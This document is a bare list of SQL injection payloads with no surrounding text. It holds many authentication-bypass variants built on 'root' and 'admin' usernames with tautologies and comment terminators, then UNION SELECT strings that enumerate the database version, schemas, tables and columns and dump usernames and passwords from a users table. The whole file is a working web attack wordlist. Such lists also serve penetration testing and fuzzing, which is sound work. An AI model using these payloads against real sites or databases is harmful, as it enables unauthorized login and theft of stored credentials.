```bash
root' --
root' #
root'/*
root' or '1'='1
root' or '1'='1'--
root' or '1'='1'#
root' or '1'='1'/*
root'or 1=1 or ''='
root' or 1=1
root' or 1=1--
root' or 1=1#
root' or 1=1/*
root') or ('1'='1
root') or ('1'='1'--
root') or ('1'='1'#
root') or ('1'='1'/*
root') or '1'='1
root') or '1'='1'--
root') or '1'='1'#
root') or '1'='1'/*

or 1=1
or 1=1--
or 1=1#
or 1=1/*
' or 1=1
' or 1=1--
' or 1=1#
' or 1=1 #
' or 1=1/*
" or 1=1
" or 1=1--
" or 1=1#
" or 1=1/*

1' or '1'='1

root" --
root" #
root"/*
root" or "1"="1
root" or "1"="1"--
root" or "1"="1"#
root" or "1"="1"/*
root" or 1=1 or ""="
root" or 1=1
root" or 1=1--
root" or 1=1#
root" or 1=1/*
root") or ("1"="1
root") or ("1"="1"--
root") or ("1"="1"#
root") or ("1"="1"/*
root") or "1"="1
root") or "1"="1"--
root") or "1"="1"#
root") or "1"="1"/*

admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*

admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin' or 1=1-- -
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*

------------------------------------------

union select 1,2-- -
union select 1,@@version
union select all 1,database()
union select all 1,table_schema from information_schema.tables 
union select all 1,table_name from information_schema.tables where table_schema='sysadmin' 
union select all 1,column_name from information_schema.columns where table_name='users' 
union select 1,(select group_concat(username,password) from sysadmin.users) 
```
